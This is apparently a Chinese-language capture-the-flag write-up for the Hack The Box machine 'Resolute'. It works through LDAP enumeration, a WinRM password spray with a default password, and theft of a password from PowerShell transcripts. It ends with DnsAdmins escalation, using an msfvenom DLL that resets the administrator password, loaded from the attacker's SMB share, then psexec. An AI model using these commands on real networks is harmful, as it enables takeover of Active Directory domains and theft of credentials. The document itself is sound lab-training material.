## 信息收集

```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101]
└─$ sudo nmap -Pn -sS -p- --open --min-rate 1000 10.10.10.169 -o scan/Resolute
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 09:18 EDT
Nmap scan report for 10.10.10.169
Host is up (0.34s latency).
Not shown: 52219 closed tcp ports (reset), 13296 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49682/tcp open  unknown
49714/tcp open  unknown
49878/tcp open  unknown

```

```
msf6 auxiliary(scanner/smb/smb_version) > run 

[*] 10.10.10.169:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:required) (uptime:10m 4s) (guid:{3fdb3a04-6ce2-4488-a444-569c87506ec5}) (authentication domain:MEGABANK)
[+] 10.10.10.169:445      -   Host is running Windows 2016 Standard (build:14393) (name:RESOLUTE) (domain:MEGABANK)
[*] 10.10.10.169:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ldap 匿名访问

列出所有计算机
```
┌──(kali㉿kali)-[~]
└─$ windapsearch -d 10.10.10.169 -m computers                            
dn: CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
cn: RESOLUTE
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: Resolute.megabank.local

dn: CN=MS02,CN=Computers,DC=megabank,DC=local
cn: MS02
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: MS02.megabank.local

```

对于域渗透，导出域信息，也就是`ldap`服务器的信息是至关重要的，里面包含了非常重要的信息，并且需要详细的分析

```
windapsearch -d 10.10.10.169 --full -m users
```

可以使用上面的命令来列出所有用户的详细信息，从用户描述中，我们可以得到创建用户时候生成的默认密码

```
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20190927131714.0Z
whenChanged: 20191203132427.0Z
displayName: Marko Novak
uSNCreated: 13110
uSNChanged: 69792
name: Marko Novak
objectGUID: 8oIRSXQNmEW4iTLjzuwCpw==
userAccountControl: 66048
badPwdCount: 10
codePage: 0
countryCode: 0
badPasswordTime: 132989980873182950
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132140638345690606
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z
```

## 密码枚举

在枚举密码之前，我们首先需要看看用户的锁定策略，防止用户被锁定

```
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -b 'dc=megabank,dc=local' -H ldap://10.10.10.169 | grep lock                                              1 ⨯
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0

```

当`lockoutThreshold=0`的时候，说明没有开启账户锁定策略，这时候我们就可以放心的进行密码枚举了。

这里直接尝试登录`winrm`服务

```
msf6 auxiliary(scanner/winrm/winrm_login) > run 

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\sunita:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\abigail:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\ryan:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\marko:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\marcus:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\sally:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\fred:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\stevie:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\angela:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\felicia:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\gustavo:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\ulf:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\claire:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\per:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\annette:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\paulo:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\steve:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\annika:Welcome123! (Incorrect: )
[-] 10.10.10.169: - LOGIN FAILED: megabank.local\claude:Welcome123! (Incorrect: )
[+] 10.10.10.169:5985 - Login Successful: megabank.local\melanie:Welcome123!
[*] Error: 10.10.10.169: WinRM::WinRMWSManFault [WSMAN ERROR CODE: 5]: <f:WSManFault Code='5' Machine='10.10.10.169' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>Access is denied. </f:Message></f:WSManFault>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

用户`melanie`使用默认密码可以成功登录`winrm`

## 提权

```
*Evil-WinRM* PS C:\Users\melanie\Desktop> ./winPEAS.bat

....
....

 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine                                                                                                                 
    PowerShellVersion    REG_SZ    5.1.14393.0                                                                                                                                      
                                                                                                                                                                                    
Transcriptions Settings:                                                                                                                                                            
                                                                                                                                                                                    
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription                                                                                                     
    EnableTranscripting    REG_DWORD    0x0                                                                                                                                         
    OutputDirectory    REG_SZ    C:\PSTranscipts                                                                                                                                    
    EnableInvocationHeader    REG_DWORD    0x0  

....
.... 
```

使用提权脚本可以看到开启了`powershell Transcription`日志

```
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         6/6/2022   6:22 AM      402653184 pagefile.sys


*Evil-WinRM* PS C:\> dir PSTranscripts -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\> dir PSTranscripts\20191203 -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\> type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt 
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************

```

得到另一个用户的授权

```
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

查看`ryan`用户的权限，该用户属于`MEGABANK\DnsAdmins `管理员组

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

对于`dnsadmin`，我们可以使用`dnscmd`来加载`dll`，从而达到提权的目的

使用`msfvenom`生成
```
msfvenom -p windows/x64/exec cmd="net user administrator P@ssw0rd@@ /domain" -f dll > dns1.dll
```

同时在我们的服务器上使用`impscket-smbserver`来启动一个`smb`服务
```
impacket-smbserver share ./
```

一切都准备好后，就可以在目标服务器上加载我们的`dll`了


```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd localhost /config /serverlevelplugindll \\10.10.16.2\share\dns1.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> get-itemproperty HKLM:\system\currentcontrolset\services\dns\parameters\ -Name serverlevelplugindll


ServerLevelPluginDll : \\10.10.16.2\share\dns1.dll
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dns\parameters\
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dns
PSChildName          : parameters
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry

```

最后我们使用`psexec`来登录服务器获得`root.txt`

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec -dc-ip 10.10.10.169 megabank.local/administrator:'P@ssw0rd@@'@10.10.10.169                              1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.169.....
[*] Found writable share ADMIN$
[*] Uploading file MFNCTgGd.exe
[*] Opening SVCManager on 10.10.10.169.....
[*] Creating service uckY on 10.10.10.169.....
[*] Starting service uckY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt

```



## 参考链接
[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

[http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)